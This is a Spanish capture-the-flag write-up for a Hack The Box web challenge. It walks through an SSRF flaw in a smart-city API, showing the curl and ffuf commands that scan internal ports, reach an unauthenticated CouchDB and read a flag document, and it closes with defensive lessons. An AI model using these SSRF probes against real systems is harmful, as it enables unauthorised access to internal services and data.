---
title: "CitiSmart"
description: "Writeup de CitiSmart - Hack The Box - Web 200pts. SSRF en /api/dashboard/endpoints descubre CouchDB en puerto 5984; acceder al documento FLAG devuelve la flag en texto plano."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - ssrf
  - couchdb
  - api
  - internal-services
---

# CitiSmart

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Una plataforma IoT de "ciudad inteligente" expone una API REST. Hay un endpoint que recibe URLs para comprobar el estado de sensores remotos — pero no valida que esas URLs sean externas, permitiendo SSRF para descubrir servicios internos.

---

## Reconocimiento

Registrar una cuenta y autenticarse:

```bash
TOKEN=$(curl -s -X POST "$HOST/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"password123"}' \
  | jq -r '.token')
```

---

## Descubrimiento del endpoint SSRF

El endpoint `/api/dashboard/endpoints` acepta una URL en el campo `url`:

```bash
curl -s -X POST "$HOST/api/dashboard/endpoints" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1/","sector":"test"}'
```

Se obtiene respuesta del servidor local — **SSRF confirmado**.

---

## Escaneo de puertos internos

Mediante fuzzing con ffuf se escanean puertos internos:

```bash
ffuf -w <(seq 1 65535 | tr '\n' '\n') \
  -u "$HOST/api/dashboard/endpoints" \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:FUZZ/","sector":"scan"}' \
  -mc 200 -fs 0
```

Puerto **5984** responde — es **CouchDB** (base de datos NoSQL).

---

## Acceso a CouchDB vía SSRF

CouchDB en modo sin autenticación expone sus datos via REST. Listar bases de datos:

```bash
curl -s -X POST "$HOST/api/dashboard/endpoints" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5984/_all_dbs","sector":"db"}'
```

```json
["_replicator","_users","citismart"]
```

Base de datos `citismart`. Acceder al documento `FLAG`:

```bash
curl -s -X POST "$HOST/api/dashboard/endpoints" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5984/citismart/FLAG","sector":"flag"}'
```

```json
{"_id":"FLAG","_rev":"1-abc...","value":"FLAG=HTB{FLAG}"}
```

---

## Cadena de Ataque

```text
1. Registrar cuenta → obtener JWT
       ↓
2. POST /api/dashboard/endpoints con url=http://127.0.0.1/... → SSRF
       ↓
3. Escanear puertos internos → puerto 5984 (CouchDB) responde
       ↓
4. http://127.0.0.1:5984/_all_dbs → ["citismart"]
       ↓
5. http://127.0.0.1:5984/citismart/FLAG → {"value":"FLAG=HTB{FLAG}"}
```

---

## Lecciones Aprendidas

- **SSRF en endpoints de integración**: los endpoints que reciben URLs para "comprobar conectividad" o "agregar fuentes de datos" son candidatos clásicos a SSRF. Validar que la URL sea un host externo/permitido usando allowlists.
- **CouchDB sin autenticación en localhost**: CouchDB escucha por defecto en `0.0.0.0:5984` sin autenticación en versiones antiguas. Configurar `require_valid_user = true` y bindear a `127.0.0.1` solo si el acceso se gestiona vía aplicación.
- **Documentos sensibles en CouchDB**: no almacenar flags, secretos o tokens en documentos CouchDB sin control de acceso a nivel de documento.

---

## Referencias

- [CouchDB Security Guide](https://docs.couchdb.org/en/stable/intro/security.html)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
